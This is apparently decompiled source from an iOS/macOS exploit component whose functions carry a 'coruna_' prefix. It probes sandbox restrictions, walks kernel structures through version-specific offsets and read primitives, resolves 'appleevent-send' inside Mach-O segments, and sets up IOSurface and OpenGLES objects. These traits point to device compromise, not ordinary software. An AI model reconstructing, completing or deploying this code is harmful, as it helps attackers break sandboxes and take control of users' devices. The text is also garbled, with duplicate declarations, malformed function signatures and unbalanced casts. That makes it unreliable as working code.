    ld11 = (ld11 / ld12) * k_kernel_rodata_word_3b788 * k_kernel_rodata_word_3b4e0;
    *(uint32_t *)(addr + scratch[0]) = tag;
    do {
      version = _mach_absolute_time();
      if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
    } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
    coruna_semaphore_timedwait(val,1000);
  }
  coruna_mach_port_deallocate_2d808(val,scratch);
  return 0;
}





bool coruna_kernel09_via_vm_protect_3(uint64_t val,long handle,uint64_t *id_2)
{
  int err;
  
  id_2[5] = 0;
  id_2[4] = 0;
  id_2[7] = 0;
  id_2[6] = 0;
  id_2[1] = 0;
  *id_2 = 0;
  id_2[3] = 0;
  id_2[2] = 0;
  err = coruna_vm_protect(val,handle + 0x40000);
  if (err != 0) {
    coruna_mach_port_deallocate_2d808(val,id_2);
  }
  return err == 0;
}





long coruna_kernel6544_via_nop_stub_3_3(long handle,unsigned long arg)
{
  int err;
  long handle;
  uint8_t scratch[32];
  unsigned long bootargs;
  
  err = coruna_nop_stub_3(handle,arg & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff),
                       scratch);
  if ((err == 0) || (bootargs == 0)) {
    handle = 0;
  }
  else {
    handle = (*(unsigned long *)(handle + 0x188) & arg) + (bootargs & 0xffffffffc000);
  }
  return handle;
}





uint64_t coruna_mach_absolute_time_192d4(uint64_t val,uint64_t *id_2)
{
  int err;
  uint64_t u;
  uint64_t size;
  uint64_t version;
  unsigned long port;
  double ld6;
  double ld7;
  mach_timebase_info_t scratch;
  
  port = *(unsigned long *)*id_2;
  if ((port & 0x90000000) == 0) {
    err = coruna_ctx_test_flag(val,0x1100000);
    if (err != 0) {
      coruna_semaphore_timedwait(val,1000);
    }
    *(unsigned long *)*id_2 = port | 0x80000000;
    *(uint8_t *)(id_2 + 7) = 1;
    scratch.numer = 0;
    scratch.denom = 0;
    _mach_timebase_info(&scratch);
    ld6 = (double)NEON_ucvtf((unsigned long)scratch >> 0x20);
    ld7 = (double)NEON_ucvtf((unsigned long)scratch & 0xffffffff);
    ld6 = (ld6 / ld7) * k_kernel_rodata_word_3b788;
    size = _mach_absolute_time();
    ld6 = ld6 * k_kernel_rodata_word_3b4e0;
    do {
      version = _mach_absolute_time();
      if ((unsigned long)(long)(ld6 + (double)size) <= version) goto fail;
    } while (((uint)*(uint64_t *)*id_2 >> 0x1c & 1) == 0);
    u = 1;
  }
  else {
fail:
    if (*(char *)(id_2 + 7) != '\0') {
      coruna_mach_absolute_time_193d0(val,id_2);
    }
    u = 0;
  }
  return u;
}





uint64_t coruna_mach_absolute_time_193d0(uint64_t val,uint64_t *id_2)
{
  int err;
  uint64_t u;
  uint64_t size;
  unsigned long version;
  double ld5;
  double ld6;
  mach_timebase_info_t scratch;
  
  if (*(char *)(id_2 + 7) != '\0') {
    version = *(unsigned long *)*id_2;
    err = coruna_ctx_test_flag(val,0x1100000);
    if (err != 0) {
      coruna_semaphore_timedwait(val,1000);
    }
    *(unsigned long *)*id_2 = version & 0xffffffff2fffffff | 0x40000000;
    scratch.numer = 0;
    scratch.denom = 0;
    _mach_timebase_info(&scratch);
    ld5 = (double)NEON_ucvtf((unsigned long)scratch >> 0x20);
    ld6 = (double)NEON_ucvtf((unsigned long)scratch & 0xffffffff);
    ld5 = (ld5 / ld6) * k_kernel_rodata_word_3b788;
    u = _mach_absolute_time();
    ld5 = ld5 * k_kernel_rodata_word_3b4e0;
    do {
      size = _mach_absolute_time();
      if ((unsigned long)(long)(ld5 + (double)u) <= size) {
        return 0;
      }
    } while (((uint)*(uint64_t *)*id_2 >> 0x1c & 1) != 0);
    *(uint8_t *)(id_2 + 7) = 0;
  }
  return 1;
}





uint64_t coruna_kernel09_via_mac_syscall(uint64_t val,uint64_t id_2)
{
  void *ptr;
  int err;
  uint64_t u;
  uint64_t scratch;
  uint64_t scratch;
  void *bootargs;
  unsigned long bootargs;
  uint thread_attr;
  void *host_info;
  
  host_info = (void *)0x0;
  thread_attr = 0;
  err = coruna_return_zero_1954c(val,0,0,&host_info,&thread_attr,0);
  ptr = host_info;
  if (err == 0) {
    u = 0xffffffff;
  }
  else {
    scratch = 0x786f62646e6153;
    bootargs = (unsigned long)thread_attr;
    bootargs = host_info;
    scratch = id_2;
    u = coruna_mac_syscall(&scratch,1,&scratch);
    if (ptr != (void *)0x0) {
      _free(ptr);
    }
  }
  return u;
}





uint64_t
void coruna_return_zero_1954c(long handle,uint64_t *val,uint *size,uint64_t *id_2,uint *flags_2,
            int flags)
{
  int err;
  long handle;
  uint64_t u;
  void *ptr;
  uint size;
  void *buf;
  long addr;
  long off;
  long base;
  unsigned long version;
  long ctx_val;
  long scratch;
  uint bootargs;
  uint thread_attr;
  uint64_t host_info;
  
  bootargs = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if (err == 0x1809) {
      addr = 0;
      size = 0x10;
      if (*(unsigned long *)(handle + 0x158) < 0x18091e01f00000) {
        size = 0x20;
      }
      base = 4;
      if (*(unsigned long *)(handle + 0x158) < 0x18091e01f00000) {
        base = 8;
      }
      ctx_val = 0x30;
    }
    else {
      if (err != 0x1c1b && err != 0x1f53) {
        return 0;
      }
      addr = 0x10;
      base = 4;
      ctx_val = 0x48;
      size = 0x10;
    }
  }
  else {
    if (err < 0x225c) {
      if (err != 0x1f54 && err != 0x2258) {
        return 0;
      }
    }
    else if (err != 0x225c) {
      if (err != 0x2712) {
        return 0;
      }
      size = 0x10;
      base = 4;
      ctx_val = 0x18;
      addr = 0x18;
      goto fail;
    }
    size = 0x10;
    base = 4;
    ctx_val = 0x18;
    addr = 0x10;
  }
fail:
  off = *(long *)(handle + 0x398);
  handle = coruna_ptr_canonicalize(handle,off);
  if (handle == 0) {
    return 0;
  }
  handle = off;
  if (0x1f5418ffffffff < *(unsigned long *)(handle + 0x158)) {
    u = coruna_kernel6544_residual_256(handle,off + addr,&scratch);
    if ((int)u == 0) {
      return u;
    }
    addr = coruna_ptr_canonicalize(handle,scratch);
    handle = scratch;
    if (addr == 0) {
      return 0;
    }
  }
  u = coruna_kernel6544_residual_256(handle,handle + ctx_val,&scratch);
  if ((int)u == 0) {
    return u;
  }
  if (scratch == 0) {
    ptr = (void *)0x0;
done:
    if ((val == (uint64_t *)0x0) && (size == (uint *)0x0)) {
      *id_2 = ptr;
      *flags_2 = bootargs;
      return 1;
    }
    if (flags == 0) {
      err = coruna_kernel6544_residual_256(handle,off,&scratch);
      if (err != 0) goto cleanup;
check_ok:
      buf = (void *)0x0;
    }
    else {
      scratch = coruna_sandbox_appleevent(handle);
      if (scratch == 0) goto check_ok;
cleanup:
      err = coruna_kernel6544_residual_256(handle,scratch,&host_info);
      if (err == 0) goto check_ok;
      err = coruna_nop_stub_6(handle,scratch + *(int *)(handle + 0x168),4,&thread_attr);
      buf = (void *)0x0;
      if ((((err != 0) && (version = (unsigned long)thread_attr, thread_attr < 0x80001)) &&
          (buf = _malloc(version), buf != (void *)0x0)) &&
         (err = coruna_nop_stub_6(handle,host_info,version,buf), err != 0)) {
        *id_2 = ptr;
        *flags_2 = bootargs;
        if (val == (uint64_t *)0x0) {
          return 1;
        }
        if (size != (uint *)0x0) {
          *val = buf;
          *size = thread_attr;
          return 1;
        }
        return 1;
      }
    }
    if (buf != (void *)0x0) {
    _free(buf);
    }
    return 0;
  }
  else {
    scratch = coruna_ptr_canonicalize(handle);
    if (scratch == 0) {
      return 0;
    }
    u = coruna_nop_stub_6(handle,(base - (unsigned long)size) + scratch,4,&bootargs);
    if ((int)u == 0) {
      return u;
    }
    bootargs = bootargs - size;
    version = (unsigned long)bootargs;
    if (0x3ff < bootargs - 1) {
      return 0;
    }
    ptr = _malloc(version);
    if (ptr == (void *)0x0) {
      return 0;
    }
    err = coruna_nop_stub_6(handle,scratch,version,ptr);
    if (err != 0) goto done;
    buf = (void *)0x0;
  }
  _free(ptr);
skip:
  if (buf != (void *)0x0) {
    _free(buf);
  }
  return 0;
}





void coruna_kernel6544_via_ctx_test_flag_4(long handle,unsigned long arg)
{
  uint8_t *ptr;
  int err;
  unsigned long u;
  long handle;
  uint64_t scratch;
  uint bootargs;
  void *thread_attr;
  uint host_info;
  void *serial_buf;
  char action [8];
  uint5 scratch;
  uint32_t bootargs;
  void *block_ctx;
  unsigned long thread_attr;
  long stack_guard;
  
  ptr = k_kernel_mach_task_self_slot;
  stack_guard = *(long *)k_kernel_stack_chk_guard_slot;
  u = coruna_kernel6544_via_kernel6544_via_return_zero_2b000_5(handle,*(uint32_t *)k_kernel_mach_task_self_slot);
  if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
  return;
  }
  ___stack_chk_fail(u);
}





uint64_t coruna_return_zero_1a9a8(long handle,void (*val,uint64_t val)
{
  long handle;
  int err;
  uint64_t u;
  long addr;
  
  if (handle == 0) {
    return 0;
  }
  if (arg == (void (*)0x0) {
    return 0;
  }
  u = coruna_kernel6544_via_kernel6544_via_return_zero_2b000_5(handle,*(uint32_t *)k_kernel_mach_task_self_slot);
  if ((int)u == 0) {
    return u;
  }
  addr = *(long *)(handle + 0x3a8);
  if (addr == 0) {
    (*arg)(val);
  }
  else {
    handle = *(long *)(&k_kernel_slot_18f0 + handle) +
            (unsigned long)(uint)((*(int *)(handle + 0x37c) + 1) * *(int *)(handle + 0x168));
    if ((((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1)) ||
        (*(int *)(&k_kernel_slot_1940 + handle) == -1)) ||
       ((*(long *)(handle + 0x218) == 0 || (*(char *)(handle + 0xc) != '\0')))) {
      u = coruna_call_mach_vm_machine_attribute_29df8(handle,handle,0);
      err = (int)u;
    }
    else {
      u = coruna_kernel6544_via_vm_protect(handle,handle,0);
      err = (int)u;
    }
    if (err == 0) {
      return u;
    }
    (*arg)(val);
    if (((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1)) ||
       ((*(int *)(&k_kernel_slot_1940 + handle) == -1 ||
        ((*(long *)(handle + 0x218) == 0 || (*(char *)(handle + 0xc) != '\0')))))) {
      u = coruna_call_mach_vm_machine_attribute_29df8(handle,handle,addr);
      err = (int)u;
    }
    else {
      u = coruna_kernel6544_via_vm_protect(handle,handle,addr);
      err = (int)u;
    }
    if (err == 0) {
      return u;
    }
  }
  return 1;
}





unsigned long coruna_sandbox_mach_lookup(int arg)

{
  uint8_t *data;
  pid_t lp2;
  int j;
  unsigned long size;
  
  lp2 = _getpid();
  size = _sandbox_check(lp2,0,0);
  if ((int)size == 0) {
    return size;
  }
  lp2 = _getpid();
  data = k_kernel_sandbox_check_no_report_slot;
  j = _sandbox_check(lp2,"mach-lookup",*(uint *)k_kernel_sandbox_check_no_report_slot | 2);
  if (j == 0) {
    lp2 = _getpid();
    j = _sandbox_check(lp2,"mach-lookup",*(uint *)data | 2);
    if (j == 0 || arg == 0) {
      return (unsigned long)(j != 0);
    }
    lp2 = _getpid();
    size = _sandbox_check(lp2,"syscall-unix",*(uint32_t *)data);
    if ((int)size == 1) {
      return size;
    }
    j = _socket(2,2,0);
    if (j == -1) {
      return 1;
    }
    _close(j);
  }
  return 0;
}





uint64_t coruna_sandbox_check(long handle)
{
  pid_t lp1;
  int err;
  uint64_t u;
  
  lp1 = _getpid();
  err = _sandbox_check(lp1,0,0);
  if ((err == 0) || (u = 0, err == 1)) {
    *(char *)(handle + 10) = (char)err;
    u = 1;
  }
  return u;
}





long coruna_sandbox_appleevent(long handle)
{
  uint8_t *ptr;
  int err;
  long handle;
  long addr;
  unsigned long u;
  uint8_t scratch[24];
  uint8_t bootargs[24];
  
  if (*(long *)(handle + 0x5c0) != 0) {
    return *(long *)(handle + 0x5c0);
  }
  if (((*(long *)(handle + 0x118) == 0) || (*(long *)(handle + 0x120) == 0)) ||
     (handle = *(long *)(*(long *)(handle + 0x118) + 0x130), handle == 0)) {
    err = coruna_ctx_test_flag(handle,0x1000);
    ptr = &k_kernel_slot_1d18;
    if (err != 0) {
      ptr = &k_kernel_slot_19f8;
    }
    handle = *(long *)(ptr + handle);
    if (handle == 0) {
      return 0;
    }
    coruna_macho_map_segsect(bootargs,handle,"__TEXT","__cstring");
    addr = coruna_kernel6544_via_kernel6544_via_cat(bootargs,"appleevent-send",0,1);
    if (addr == 0) {
      return 0;
    }
    coruna_macho_map_segsect(scratch,handle,"__DATA_CONST","__const");
    addr = coruna_kernel6544_via_nop_stub(scratch,addr,*(uint8_t *)(handle + 0x34),1);
    if (addr == 0) {
      return 0;
    }
    if (*(int *)(handle + 0x140) < 0x1c1b) {
      if (*(int *)(handle + 0x140) < 0x1809) {
        u = coruna_sizeof_ptr(handle);
        addr = coruna_kernel_remote_trampoline(handle,addr + (u & 0xffffffff) * -2);
      }
      else {
        addr = addr + -0x80;
      }
    }
    else {
      addr = addr + -0xb8;
    }
    handle = coruna_ptr_canonicalize(handle,addr);
    if (handle == 0) {
      return 0;
    }
    if ((*(long *)(handle + 0x118) != 0) && (*(long *)(handle + 0x120) != 0)) {
      *(long *)(*(long *)(handle + 0x118) + 0x130) = handle;
    }
  }
  *(long *)(handle + 0x5c0) = handle;
  return handle;
}





bool coruna_kernel6544_residual_252(long handle,short *arg,uint64_t val)
{
  int err;
  long handle;
  uint u;
  long addr;
  int status;
  void *ptr;
  uint size;
  long off;
  unsigned long version;
  uint port;
  uint scratch;
  
  if (((*(int *)(handle + 0x140) == 0x1c1b || *(int *)(handle + 0x140) == 0x1809) &&
      (size = (uint)val, 0xb < size)) && (-1 < *arg)) {
    off = (unsigned long)*(byte *)((long)arg + 5) * 2;
    addr = (unsigned long)*(byte *)(arg + 5) + (unsigned long)(ushort)arg[4] +
            (unsigned long)*(byte *)((long)arg + 0xb);
    handle = off + addr * 2 + 0xc;
    port = (uint)handle;
    if (port <= size) {
      u = port + (uint)*(byte *)(arg + 2) * 2;
      err = 0;
      if ((u & 6) != 0) {
        err = 8 - (u & 6);
      }
      u = err + u;
      scratch = u;
      ptr = _calloc((unsigned long)(size << 3),1);
      if (ptr == (void *)0x0) {
        return false;
      }
      if (port < u) {
        version = 0;
        err = (int)addr * 2 + (int)off + 0xc;
        do {
          size = (uint)*(ushort *)((long)arg + version + handle);
          if (size == 0) break;
          size = u + size * 8;
          if (size < (uint)(err + (int)version)) {
            status = -2;
            _free(ptr);
            return status == 0;
          }
          status = coruna_kernel6544_residual_253(arg,val,ptr,u,size,&scratch);
          _free(ptr);
          return status == 0;
        } while (err + size < scratch);
      }
      status = 0;
fail:
      _free(ptr);
      return status == 0;
    }
  }
  return false;
}





uint64_t
void coruna_kernel6544_residual_253(long handle,uint64_t val,long addr_2,uint64_t id_2,uint size,
            uint *flags_2)
{
  char *ptr;
  uint64_t u;
  
  if ((uint)val < size + 8) {
    u = 0xffffffff;
  }
  else {
    if (*(char *)(addr_2 + (unsigned long)(size >> 3)) == '\0') {
      *(uint8_t *)(addr_2 + (unsigned long)(size >> 3)) = 1;
      if (size < *flags_2) {
        *flags_2 = size;
      }
      ptr = (char *)(handle + (unsigned long)size);
      if (*ptr == '\x01') {
        if ((*(ushort *)(ptr + 1) & 1) != 0) {
          *(ushort *)(ptr + 1) = *(ushort *)(ptr + 1) & 0xfffa;
        }
      }
      else {
        u = coruna_kernel6544_residual_253(handle,val,addr_2,id_2,
                             (int)id_2 + (uint)*(ushort *)(ptr + 4) * 8,flags_2);
        if ((int)u != 0) {
          return u;
        }
        u = coruna_kernel6544_residual_253(handle,val,addr_2,id_2,
                             (int)id_2 + (uint)*(ushort *)(ptr + 6) * 8,flags_2);
        if ((int)u != 0) {
          return u;
        }
      }
    }
    u = 0;
  }
  return u;
}





uint64_t coruna_iosurface_lock_gles(long handle)
{
  int err;
  uint64_t *ptr;
  long handle;
  long addr;
  long off;
  uint64_t *buf;
  
  err = coruna_ioobjectrelease("IOSurfaceRoot",0x78);
  if (err == 0) {
    if (*(long *)(&k_kernel_slot_18d0 + handle) != 0) {
      return 1;
    }
    ptr = _calloc(1,0xe0);
    if (ptr == (uint64_t *)0x0) {
      return 0;
    }
    handle = _dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface",1);
    if (handle != 0) {
      addr = _dlopen("/System/Library/Frameworks/OpenGLES.framework/OpenGLES",1);
      if (addr != 0) {
        off = _dlsym(addr,"glEnable");
        ptr[0xc] = off;
        if (off != 0) {
          off = _dlsym(addr,"glClear");
          ptr[0xd] = off;
          if (off != 0) {
            off = _dlsym(addr,"glFlush");
            ptr[0xe] = off;
            if (off != 0) {
              off = _dlsym(addr,"glViewport");
              ptr[0x1b] = off;
              if (off != 0) {
                off = _dlsym(addr,"glGetIntegerv");
                ptr[0x1a] = off;
                if (off != 0) {
                  off = _dlsym(addr,"glDeleteFramebuffersOES");
                  ptr[0x19] = off;
                  if (off != 0) {
                    off = _dlsym(addr,"glDeleteRenderbuffersOES");
                    ptr[0x18] = off;
                    if (off != 0) {
                      off = _dlsym(addr,"glGetFramebufferAttachmentParameterivOES");
                      ptr[0x17] = off;
                      if (off != 0) {
                        off = _dlsym(addr,"glScissor");
                        ptr[0x16] = off;
                        if (off != 0) {
                          off = _dlsym(addr,"glCheckFramebufferStatusOES");
                          ptr[0x15] = off;
                          if (off != 0) {
                            off = _dlsym(addr,"glRenderbufferStorageOES");
                            ptr[0x14] = off;
                            if (off != 0) {
                              off = _dlsym(addr,"glFramebufferRenderbufferOES");
                              ptr[0x13] = off;
                              if (off != 0) {
                                off = _dlsym(addr,"glBindRenderbufferOES");
                                ptr[0x12] = off;
                                if (off != 0) {
                                  off = _dlsym(addr,"glGenRenderbuffersOES");
                                  ptr[0x11] = off;
                                  if (off != 0) {
                                    off = _dlsym(addr,"glBindFramebufferOES");
                                    ptr[0x10] = off;
                                    if (off != 0) {
                                      off = _dlsym(addr,"glGenFramebuffersOES");
                                      ptr[0xf] = off;
                                      if (off != 0) {
                                        off = _dlsym(handle,"IOSurfaceLock");
                                        ptr[10] = off;
                                        if (off != 0) {
                                          off = _dlsym(handle,"IOSurfaceUnlock");
                                          ptr[0xb] = off;
                                          if (off != 0) {
                                            off = _dlsym(handle,"IOSurfaceGetSeed");
                                            ptr[9] = off;
                                            if (off != 0) {
                                              off = _dlsym(handle,"IOSurfaceCreate");
                                              ptr[8] = off;
                                              if ((off != 0) &&
                                                 (buf = (uint64_t *)
                                                           _dlsym(handle,"kIOSurfaceAllocSize"),
                                                 buf != (uint64_t *)0x0)) {
                                                ptr[7] = *buf;
                                                buf = (uint64_t *)
                                                         _dlsym(handle,"kIOSurfacePixelFormat");
                                                if (buf != (uint64_t *)0x0) {
                                                  ptr[6] = *buf;
                                                  buf = (uint64_t *)
                                                           _dlsym(handle,"kIOSurfaceBytesPerElement")
                                                  ;
                                                  if (buf != (uint64_t *)0x0) {
                                                    ptr[5] = *buf;
                                                    buf = (uint64_t *)
                                                             _dlsym(handle,"kIOSurfaceHeight");
                                                    if (buf != (uint64_t *)0x0) {
                                                      ptr[4] = *buf;
                                                      buf = (uint64_t *)
                                                               _dlsym(handle,"kIOSurfaceWidth");
                                                      if (buf != (uint64_t *)0x0) {
                                                        ptr[3] = *buf;
                                                        buf = (uint64_t *)
                                                                 _dlsym(handle,
                                                  "kIOSurfaceBytesPerRow");
                                                  if (buf != (uint64_t *)0x0) {
                                                    ptr[2] = *buf;
                                                    buf = (uint64_t *)
                                                             _dlsym(handle,"kIOFenceAllowTearing");
                                                    if (buf != (uint64_t *)0x0) {
                                                      ptr[1] = *buf;
                                                      buf = (uint64_t *)
                                                               _dlsym(handle,"kIOSurfaceIsGlobal");
                                                      if (buf != (uint64_t *)0x0) {
                                                        *ptr = *buf;
                                                        _dlclose(handle);
                                                        _dlclose(addr);
                                                        *(uint64_t **)(&k_kernel_slot_18d0 + handle) =
                                                             ptr;
                                                        return 1;
                                                      }
                                                    }
                                                  }
                                                  }
                                                  }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
        _dlclose(handle);
        handle = addr;
      }
      _dlclose(handle);
    }
    _free(ptr);
  }
  return 0;
}





uint64_t coruna_dispatch_group_async(long handle,long addr_2,int flags,uint8_t buf)
{
  dispatch_group_t ptr;
  dispatch_queue_t buf;
  uint64_t u;
  long handle;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long serial_buf;
  long action;
  long block_ctx;
  uint8_t stack_guard;
  uint8_t sa_saved;
  
  handle = *(long *)(&k_kernel_slot_18d0 + handle);
  if (handle == 0) {
fail:
    u = 0;
  }
  else {
    ptr = _dispatch_group_create();
    *(dispatch_group_t *)(addr_2 + 0x18) = ptr;
    *(uint32_t *)(addr_2 + 0x21) = 0;
    *(uint32_t *)(addr_2 + 0x22) = 0;
    buf = _dispatch_get_global_queue(0,0);
    scratch = k_kernel_nsconcretestackblock_slot;
    bootargs = k_kernel_rodata_word_3b760;
    thread_attr = coruna_eagl_attach_surface;
    host_info = &k_kernel_rodata_word_3c990;
    sa_saved = (uint8_t)flags;
    serial_buf = handle;
    action = addr_2;
    block_ctx = handle;
    stack_guard = buf;
    _dispatch_group_async(ptr,buf,&scratch);
    if (flags != 0) {
      do {
        if ((*(byte *)(addr_2 + 0x21) & 1) != 0) break;
      } while ((*(byte *)(addr_2 + 0x22) & 1) == 0);
      if ((*(byte *)(addr_2 + 0x22) & 1) != 0) goto fail;
    }
    u = 1;
  }
  return u;
}





void coruna_eagl_attach_surface(long handle)
{
  uint u;
  uint64_t *ptr;
  long *ptr;
  int err;
  uint64_t size;
  uint64_t version;
  long handle;
  long addr;
  uint scratch;
  uint scratch;
  uint32_t bootargs;
  uint32_t thread_attr;
  uint32_t host_info;
  
  ptr = *(uint64_t **)(handle + 0x20);
  ptr = *(long **)(handle + 0x28);
  size = _sel_registerName("alloc");
  version = _objc_getClass("EAGLContext");
  handle = _objc_msgSend(version,size);
  if (handle != 0) {
    size = _sel_registerName("initWithAPI:sharegroup:");
    handle = _objc_msgSend(handle,size,2,0);
    if (handle != 0) {
      *ptr = handle;
      size = _sel_registerName("setCurrentContext:");
      err = _objc_msgSend(version,size,handle);
      if (err != 0) {
        (*(void (*)ptr[0x1a])(0xd33,&scratch);
        (*(void (*)ptr[0x1a])(0x84e8,&scratch);
        u = scratch;
        if ((int)scratch <= (int)scratch) {
          u = scratch;
        }
        if (((u & 0x1f) == 0) &&
           (handle = _CFDictionaryCreateMutable
                              (0,0,k_kernel_kcftypedictionarykeycallbacks_slot,
                               k_kernel_kcftypedictionaryvaluecallbacks_slot), handle != 0)) {
          _CFDictionarySetValue(handle,*ptr,*(uint64_t *)k_kernel_kcfbooleanfalse_slot);
          _CFDictionarySetValue(handle,ptr[1],*(uint64_t *)k_kernel_kcfbooleantrue_slot);
          coruna_cfdictionarysetvalue_1aae0(handle,ptr[2],u * 4);
          coruna_cfdictionarysetvalue_1aae0(handle,ptr[3],u);
          coruna_cfdictionarysetvalue_1aae0(handle,ptr[4],u);
          coruna_cfdictionarysetvalue_1aae0(handle,ptr[5],4);
          coruna_cfdictionarysetvalue_1aae0(handle,ptr[6],0x42475241);
          coruna_cfdictionarysetvalue_1aae0(handle,ptr[7],u * 4 * u);
          addr = (*(void (*)ptr[8])(handle);
          _CFRelease(handle);
          if (addr != 0) {
            host_info = (*(void (*)ptr[9])(addr);
            err = (*(void (*)ptr[10])(addr,0,&host_info);
            if (err == 0) {
              ptr[1] = addr;
              host_info = 0;
              (*(void (*)ptr[0x1a])(0x8ca7,&host_info);
              (*(void (*)ptr[0xf])(1,ptr + 2);
              (*(void (*)ptr[0x10])(0x8d40,(int)ptr[2]);
              (*(void (*)ptr[0x11])(1,&thread_attr);
              (*(void (*)ptr[0x12])(0x8d41,thread_attr);
              *(uint8_t *)((long)ptr + 0x14) = 1;
              size = _sel_registerName("attachImage:toCoreSurface:invertedRender:");
              err = _objc_msgSend(*ptr,size,0x8d41,ptr[1],1);
              if (err != 0) {
                (*(void (*)ptr[0x13])(0x8d40,0x8ce0,0x8d41,thread_attr);
                (*(void (*)ptr[0x11])(1,&bootargs);
                (*(void (*)ptr[0x12])(0x8d41,bootargs);
                (*(void (*)ptr[0x14])(0x8d41,0x81a6,u,u);
                (*(void (*)ptr[0x13])(0x8d40,0x8d00,0x8d41,bootargs);
                err = (*(void (*)ptr[0x15])(0x8d40);
                if (err == 0x8cd5) {
                  (*(void (*)ptr[0x1b])(0,0,u,u);
                  (*(void (*)ptr[0x16])(0,0,u,u);
                  (*(void (*)ptr[0x12])(0x8d41,host_info);
                  (*(void (*)ptr[0x1b])(0,0,u,u);
                  *(uint *)(*(long *)(handle + 0x28) + 0x20) = *(byte *)(handle + 0x39) ^ 1;
                  *(uint32_t *)(*(long *)(handle + 0x28) + 0x21) = 1;
                  do {
                    handle = *(long *)(handle + 0x20);
                    (**(void (**)(handle + 0x60))(0xb71);
                    (**(void (**)(handle + 0x68))(&k_kernel_slot_4100);
                    (**(void (**)(handle + 0x70))();
                    if ((*(byte *)(*(long *)(handle + 0x28) + 0x20) & 1) == 0) {
                      coruna_semaphore_timedwait(*(uint64_t *)(handle + 0x30),1000);
                    }
                  } while ((*(byte *)(*(long *)(handle + 0x28) + 0x20) & 1) == 0);
                  handle = *(long *)(handle + 0x20);
                  ptr = *(long **)(handle + 0x28);
                  if (*(char *)((long)ptr + 0x14) != '\0') {
                    (**(void (**)(handle + 0x80))(0x8d40,(int)ptr[2]);
                    (**(void (**)(handle + 0xb8))(0x8d40,0x8ce0,0x8cd1,&thread_attr);
                    (**(void (**)(handle + 0xc0))(1,&thread_attr);
                    (**(void (**)(handle + 0xb8))(0x8d40,0x8d00,0x8cd1,&bootargs);
                    (**(void (**)(handle + 0xc0))(1,&bootargs);
                    (**(void (**)(handle + 200))(1,ptr + 2);
                  }
                  if (ptr[1] != 0) {
                    host_info = (**(void (**)(handle + 0x48))();
                    err = (**(void (**)(handle + 0x58))(ptr[1],0,&host_info);
                    if (err == 0) {
                      _CFRelease(ptr[1]);
                      ptr[1] = 0;
                    }
                  }
                  if (*ptr == 0) {
                    return;
                  }
                  size = _sel_registerName("release");
                  _objc_msgSend(*ptr,size);
                  return;
                }
              }
              *(uint32_t *)(*(long *)(handle + 0x28) + 0x22) = 1;
              return;
            }
            _CFRelease(addr);
          }
        }
        ptr[1] = 0;
      }
    }
  }
fail:
  *(uint32_t *)(*(long *)(handle + 0x28) + 0x22) = 1;
  return;
}





void coruna_dispatch_group_wait(uint64_t val,long handle)
{
  if (*(long *)(handle + 0x18) != 0) {
    *(uint32_t *)(handle + 0x20) = 1;
    _dispatch_group_wait(*(dispatch_group_t *)(handle + 0x18),0xffffffffffffffff);
    _dispatch_release(*(dispatch_object_t *)(handle + 0x18));
    *(uint64_t *)(handle + 0x18) = 0;
  }
  return;
}





void coruna_free_1b984(long handle,uint64_t *val)
{
  *(uint64_t *)(&k_kernel_slot_18d0 + handle) = 0;
  val[4] = 0;
  val[1] = 0;
  *val = 0;
  val[3] = 0;
  val[2] = 0;
  _free(val);
  return;
}





void coruna_cfdictionarysetvalue_1aae0(uint64_t val,uint64_t id_2,uint32_t size)
{
  uint64_t u;
  uint32_t scratch;
  
  scratch = size;
  u = _CFNumberCreate(0,9,&scratch);
  _CFDictionarySetValue(val,id_2,u);
  _CFRelease(u);
  return;
}





uint64_t coruna_kernel6544_residual_254(uint64_t val,char *path,uint64_t *id_2)
{
  size_t ls1;
  uint64_t u;
  uint64_t scratch;
  
  ls1 = _strlen(path);
  u = coruna_kernel6544_via_ptr_canonicalize_4(val,path,ls1 + 1,&scratch);
  if ((int)u != 0) {
    *id_2 = scratch;
    u = 1;
  }
  return u;
}





long coruna_kernel6544_via_ptr_canonicalize_4(long handle,long addr_2,unsigned long arg)
{
  int err;
  long handle;
  long scratch;
  long bootargs;
  long thread_attr;
  
  scratch = 0;
  err = coruna_kernel6544_residual_193(handle,addr_2 + (unsigned long)(4 < *(long *)(handle + 0x158) +
                                                     0xffe0abe700000000U >> 0x20) * 0x10,&thread_attr);
  if ((err != 0) && (handle = coruna_ptr_canonicalize(handle,thread_attr), handle != 0)) {
    if (*(int *)(handle + 0x140) < 0x1c1b) {
      return thread_attr;
    }
    err = coruna_kernel6544_residual_193(handle,thread_attr + 0x20,&bootargs);
    if ((err != 0) && (handle = coruna_ptr_canonicalize(handle,bootargs), handle != 0)) {
      if ((arg & 1) != 0) {
        return bootargs;
      }
      err = coruna_kernel6544_via_kernel6544_via_fd_read_full_2(handle,bootargs + 0x38,&scratch);
      if (err == 0) {
        return scratch;
      }
      handle = coruna_ptr_canonicalize(handle);
      return handle;
    }
  }
  return 0;
}





uint64_t coruna_buf_init(uint64_t *val)
{
  if (val != (uint64_t *)0x0) {
    *val = 0;
    val[1] = 0;
    *(uint32_t *)(val + 2) = 0;
    return 0;
  }
  return 0xad001;
}





uint64_t coruna_free_1bd0c(uint64_t *val)
{
  if (val != (uint64_t *)0x0) {
    if ((void *)*val != (void *)0x0) {
      _free((void *)*val);
    }
    *val = 0;
    val[1] = 0;
    *(uint32_t *)(val + 2) = 0;
    return 0;
  }
  return 0xad001;
}





void coruna_kernel6544_via_buf_grow(long *handle,uint32_t size)
{
  uint u;
  int err;
  long handle;
  
  err = coruna_buf_grow((int)handle,0xc);
  if (err == 0) {
    handle = *handle;
    u = *(uint *)(handle + 1);
    *(uint32_t *)((unsigned long)u + handle) = size;
    *(uint64_t *)((uint32_t *)((unsigned long)u + handle) + 1) = k_kernel_rodata_word_3b4f0;
    *(int *)(handle + 1) = (int)handle[1] + 0xc;
